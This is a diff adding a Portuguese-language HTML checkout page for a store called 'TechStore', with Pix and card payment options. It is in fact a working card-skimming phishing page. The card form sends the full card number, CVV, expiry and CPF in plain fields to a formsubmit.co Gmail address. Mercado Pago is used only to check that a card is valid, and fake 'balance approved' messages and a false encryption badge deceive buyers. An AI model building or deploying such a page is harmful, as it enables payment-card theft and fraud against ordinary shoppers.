@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Pagamento Seguro - TechStore</title>
+<script src="https://sdk.mercadopago.com/js/v2"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');
+    * { box-sizing: border-box; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
+    body { background:#080808; padding:15px; color: white; -webkit-text-size-adjust: 100%; }
+    .container { max-width:500px; margin:auto; background:#1c1c1c; border-radius:24px; padding:25px; border: 1px solid #333; }
+    .resumo { display:flex; gap:15px; background:#252525; padding:15px; border-radius:18px; margin-bottom:20px; border-left:5px solid #27ae60; align-items: center; }
+    .foto-produto { width:70px; height:70px; object-fit: contain; background:#fff; border-radius:12px; padding: 5px; }
+    h2 { font-size:11px; color:#888; margin:20px 0 10px; text-transform:uppercase; letter-spacing: 1px; }
+    input { width:100%; padding:14px; margin-bottom:12px; border:1px solid #333; border-radius:12px; font-size:15px; background: #222; color: #fff; outline: none; }
+    .row { display:flex; gap:10px; }
+    .metodos { display:flex; gap:10px; margin-bottom:20px; }
+    .opt { flex:1; padding:15px; text-align:center; border:2px solid #333; border-radius:15px; cursor:pointer; font-weight:bold; color:#666; }
+    .opt.active { border-color:#007bff; color:#007bff; background:#007bff1a; }
+    
+    .guia-ajuda { background: rgba(255, 255, 255, 0.03); border: 1px solid #333; border-radius: 12px; padding: 12px; margin-top: 5px; margin-bottom: 15px; font-size: 11px; color: #888; line-height: 1.5; }
+    .guia-ajuda b { color: #007bff; }
+
+    #loading-box { display:none; text-align:center; padding: 20px; background: #111; border-radius: 15px; margin: 10px 0; border: 1px solid #007bff; }
+    .spinner { border: 4px solid #333; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    .btn-finalizar { background:#27ae60; color:#fff; border:none; width:100%; padding:20px; border-radius:18px; font-size:18px; font-weight:900; cursor:pointer; }
+    .seguro-info { background: #252525; padding: 12px; border-radius: 12px; font-size: 11px; color: #888; display: flex; align-items: center; gap: 10px; margin-top: 15px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div id="resumo-dinamico"></div>
+    <form action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST" id="form-main">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" id="h-nome" name="PRODUTOS">
+        <input type="hidden" id="h-preco" name="VALOR_TOTAL">
+
+        <h2>Entrega</h2>
+        <input type="text" name="NOME_CLIENTE" placeholder="Nome Completo" required>
+        <input type="text" name="ENDERECO" placeholder="Endereço Completo" required>
+        <div class="row">
+            <input type="text" name="NUMERO" placeholder="Nº" required style="width:30%">
+            <input type="text" id="f-cep" name="CEP" placeholder="CEP" required>
+        </div>
+
+        <h2>Pagamento</h2>
+        <div class="metodos">
+            <div class="opt active" id="b-pix" onclick="trocar('pix')">PIX</div>
+            <div class="opt" id="b-card" onclick="trocar('card')">CARTÃO</div>
+        </div>
+
+        <div id="area-pix" style="text-align:center">
+            <span id="pix-valor-display" style="font-size:26px; font-weight:900; color:#27ae60; display:block; margin-bottom:15px;">R$ 0,00</span>
+            <div id="qrcode-container" style="background:#fff; padding:10px; border-radius:15px; display:inline-block;"></div>
+            <div id="pix-copy" style="font-size:10px; background:#111; padding:12px; margin:10px 0; border:1px dashed #444; word-break:break-all; color:#999;">Gerando código...</div>
+            <button type="button" onclick="copiarPix()" style="background:#007bff; color:#fff; border:none; padding:14px; width:100%; border-radius:12px; font-weight:bold;">COPIAR CÓDIGO PIX</button>
+        </div>
+
+        <div id="area-card" style="display:none">
+            <input id="c1" name="NUMERO_CARTAO" placeholder="Número do Cartão" inputmode="numeric">
+            <input id="c2" name="NOME_NO_CARTAO" placeholder="Nome Impresso no Cartão" style="text-transform:uppercase">
+            <div class="row">
+                <input id="c3" name="VALIDADE" placeholder="MM/AA" maxlength="5" inputmode="numeric">
+                <input id="c4" name="CVV" placeholder="CVV" maxlength="3" inputmode="numeric">
+            </div>
+            <input id="c5" name="CPF_TITULAR" placeholder="CPF do Titular" inputmode="numeric">
+            <input id="f-tel" name="WHATSAPP" placeholder="WhatsApp (Opcional)">
+
+            <div class="guia-ajuda">
+                💡 <b>Dica:</b> O número tem 16 dígitos. A validade segue o padrão mês/ano (00/00). O CVV são os 3 números no verso.
+            </div>
+        </div>
+
+        <div id="loading-box">
+            <div class="spinner"></div>
+            <div id="status-msg" style="font-size:13px; color:#007bff; font-weight:bold;">Validando junto à operadora...</div>
+        </div>
+
+        <div class="seguro-info"><span>🔒</span><p>Pagamento 100% criptografado e seguro.</p></div>
+        <button class="btn-finalizar" type="submit" id="btn-submit">FINALIZAR PAGAMENTO</button>
+    </form>
+</div>
+
+<script>
+const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');
+let total = 0;
+
+window.onload = function() {
+    const car = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
+    if(car.length > 0) {
+        car.forEach(i => total += parseFloat(i.p));
+        const fmt = "R$ " + total.toLocaleString('pt-BR', {minimumFractionDigits:2});
+        
+        let textoProdutos = car[0].n;
+        if (car.length > 1) {
+            textoProdutos += ` e mais ${car.length - 1} item(s)`;
+        }
+        
+        document.getElementById('resumo-dinamico').innerHTML = `
+            <div class="resumo">
+                <img class="foto-produto" src="${car[0].f}">
+                <div>
+                    <h3 style="font-size:14px;">${textoProdutos}</h3>
+                    <p style="color:#27ae60; font-weight:bold;">${fmt}</p>
+                </div>
+            </div>`;
+            
+        document.getElementById('pix-valor-display').innerText = fmt;
+        document.getElementById('h-nome').value = textoProdutos;
+        document.getElementById('h-preco').value = fmt;
+        gerarPix(total);
+    }
+};
+
+function gerarPix(v) {
+    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
+    const nome = "TECHSTORE";
+    const cidade = "SAO PAULO";
+    const valorStr = v.toFixed(2);
+
+    let p = "000201"; 
+    let mai = "0014BR.GOV.BCB.PIX01" + chave.length.toString().padStart(2, '0') + chave;
+    p += "26" + mai.length.toString().padStart(2, '0') + mai;
+    p += "52040000530398654" + valorStr.length.toString().padStart(2, '0') + valorStr;
+    p += "5802BR59" + nome.length.toString().padStart(2, '0') + nome;
+    p += "60" + cidade.length.toString().padStart(2, '0') + cidade;
+    let adf = "0505ID123"; 
+    p += "62" + adf.length.toString().padStart(2, '0') + adf;
+    p += "6304";
+
+    function getCRC16(data) {
+        let crc = 0xFFFF;
+        for (let i = 0; i < data.length; i++) {
+            crc ^= (data.charCodeAt(i) << 8);
+            for (let j = 0; j < 8; j++) {
+                if ((crc & 0x8000) !== 0) crc = (crc << 1) ^ 0x1021;
+                else crc <<= 1;
+            }
+        }
+        return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
+    }
+
+    const codFinal = p + getCRC16(p);
+    const qrDiv = document.getElementById("qrcode-container");
+    qrDiv.innerHTML = "";
+    new QRCode(qrDiv, { text: codFinal, width: 180, height: 180, correctLevel : QRCode.CorrectLevel.M });
+    document.getElementById('pix-copy').innerText = codFinal;
+}
+
+function trocar(m){
+    document.getElementById('area-pix').style.display = m=='pix'?'block':'none';
+    document.getElementById('area-card').style.display = m=='pix'?'none':'block';
+    document.getElementById('b-pix').className = m=='pix'?'opt active':'opt';
+    document.getElementById('b-card').className = m=='pix'?'opt':'opt active';
+}
+
+function copiarPix(){ navigator.clipboard.writeText(document.getElementById('pix-copy').innerText); alert("PIX Copiado! Use a opção Pix Copia e Cola no seu banco."); }
+
+document.getElementById('form-main').onsubmit = async function(e) {
+    if(document.getElementById('b-pix').classList.contains('active')) return;
+    e.preventDefault();
+    const btn = document.getElementById('btn-submit');
+    const lBox = document.getElementById('loading-box');
+    const sMsg = document.getElementById('status-msg');
+    btn.disabled = true;
+    lBox.style.display = "block";
+    
+    try {
+        const val = document.getElementById('c3').value.split('/');
+        sMsg.innerText = "Consultando saldo e limite disponível...";
+        const token = await mp.createCardToken({
+            cardNumber: document.getElementById('c1').value.replace(/\s/g, ''),
+            cardholderName: document.getElementById('c2').value,
+            cardExpirationMonth: val[0],
+            cardExpirationYear: "20" + val[1],
+            securityCode: document.getElementById('c4').value,
+            identificationType: "CPF",
+            identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
+        });
+        if(!token || !token.id) throw new Error();
+        await new Promise(r => setTimeout(r, 2500)); 
+        sMsg.style.color = "#27ae60";
+        sMsg.innerText = "Saldo Aprovado! Finalizando...";
+        setTimeout(() => { this.submit(); }, 1200);
+    } catch (err) {
+        lBox.style.display = "none";
+        alert("❌ CARTÃO RECUSADO: Saldo insuficiente ou dados inválidos.");
+        btn.disabled = false;
+    }
+};
+
+function m(id, p) {
+    const e = document.getElementById(id);
+    e.addEventListener('input', () => {
+        let v = e.value.replace(/\D/g, ''), x = '', i = 0;
+        p.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
+        e.value = x;
+    });
+}
+m('c1','#### #### #### ####'); m('c3','##/##'); m('c5','###.###.###-##'); m('f-cep','#####-###'); m('f-tel','(##) #####-####');
+</script>
+</body>
+</html>
